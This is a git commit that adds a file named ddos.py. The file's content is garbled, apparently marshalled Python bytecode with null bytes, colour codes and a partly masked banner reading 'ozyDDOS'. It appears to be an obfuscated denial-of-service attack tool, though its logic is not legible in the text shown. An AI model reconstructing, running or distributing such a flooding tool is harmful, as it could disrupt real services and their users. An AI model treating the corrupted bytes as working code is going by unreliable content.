a1244a44fc470635cceb18791d4fc2d5a69af3dc
ozy28 <fauzinurramadhan565@gmail.com>
2024-07-12 00:28:05 +0700

    Update

---
+++ ddos.py
@@ -0,0 +1,11 @@
+� 
+b�t_c&#x0;&#x0;&#x0;&#x0;&#x0;&#x0;&#x0;&#x0;&#x0;&#x0;&#x0;@&#x0;&#x0;&#x0;s!&#x0;&#x0;&#x0;d&#x0;&#x0;d&#x0;l&#x0;&#x0;Z&#x0;&#x0;e&#x0;&#x0;j&#x0;d&#x0;�&#x0;d&#x0;Ud&#x0;S(&#x0;&#x0;&#x0;i����Ns�&#x0;&#x0;c&#x0;&#x0;&#x0;&#x0;&#x0;&#x0;&#x0;&#x0;&#x0;&#x0;&#x0;@&#x0;&#x0;&#x0;s<&#x0;&#x0;d&#x0;&#x0;d&#x0;l&#x0;&#x0;Z&#x0;&#x0;d&#x0;&#x0;d&#x0;l&#x0;Z&#x0;d&#x0;&#x0;d&#x0;l&#x0;Z&#x0;d&#x0;&#x0;d&#x0;l&#x0;Z&#x0;d&#x0;&#x0;d&#x0;l&#x0;Z&#x0;d&#x0;&#x0;d&#x0;l&#x0;m&#x0;Z&#x0;e&#x0;j&#x0;�&#x0;&#x0;Z&#x0;e&#x0;j&#x0;Z&#x0;e&#x0;j&#x0;Z&#x0;e&#x0;j        &#x0;Z        &#x0;e&#x0;j
+&#x0;Z
+&#x0;e&#x0;j&#x0;Z&#x0;e&#x0;j&#x0;e&#x0;j&#x0;e&#x0;j &#x0;�&#x0;Z&#x0;e&#x0;j&#x0;d&#x0;�&#x0;Z&#x0;e&#x0;j&#x0;d&#x0;�&#x0;d&#x0;GHd&#x0;GHd&#x0;GHd&#x0;GHd        &#x0;GHd
+&#x0;GHd&#x0;GHd&#x0;GHd&#x0;GHd&#x0;GHd &#x0;GHd&#x0;GHe&#x0;d&#x0;�&#x0;Z&#x0;e&#x0;d&#x0;�&#x0;Z&#x0;e&#x0;j&#x0;d&#x0;�&#x0;d&#x0;GHe&#x0;j&#x0;d&#x0;�&#x0;e&#x0;j&#x0;d&#x0;�&#x0;d&#x0;GHe&#x0;j&#x0;d&#x0;�&#x0;e&#x0;j&#x0;d&#x0;�&#x0;d&#x0;GHe&#x0;j&#x0;d&#x0;�&#x0;e&#x0;j&#x0;d&#x0;�&#x0;d&#x0;GHe&#x0;j&#x0;d&#x0;�&#x0;e&#x0;j&#x0;d&#x0;�&#x0;d&#x0;GHe&#x0;j&#x0;d&#x0;�&#x0;e&#x0;j&#x0;d&#x0;�&#x0;d&#x0;GHe&#x0;j&#x0;d&#x0;�&#x0;e&#x0;j&#x0;d&#x0;�&#x0;d&#x0;Z&#x0;x[&#x0;e&#x0;r7e&#x0;j&#x0;e&#x0;e&#x0;e&#x0;f&#x0;�&#x0;e&#x0;d&#x0;Z&#x0;e&#x0;d&#x0;Z&#x0;d&#x0;e&#x0;e&#x0;e&#x0;f&#x0;GHe&#x0;d&#x0;k&#x0;r�d&#x0;Z&#x0;q�q�Wd&#x0;S(&#x0;&#x0;&#x0;i����N(&#x0;&#x0;&#x0;t&#x0;&#x0;&#x0;datetimei�&#x0;&#x0;t&#x0;&#x0;&#x0;clears�&#x0;&#x0;[1;31m
+
+XXXX
+XXXX XXXX XXX. XXX XXX XX. XXX XXX XXXX   XXX XXXXX XXX
+XXX XX XX XX XX XXX X.              XXXXXXX XXXX
+XXXXXXX. XXX XXXX.        ozyDDOS        XXXXXX. XXXXXX XXXX X
+ZXZXX ZX X ZXX X XXXXXXX XXXXXXXXXX XXXX.  #########
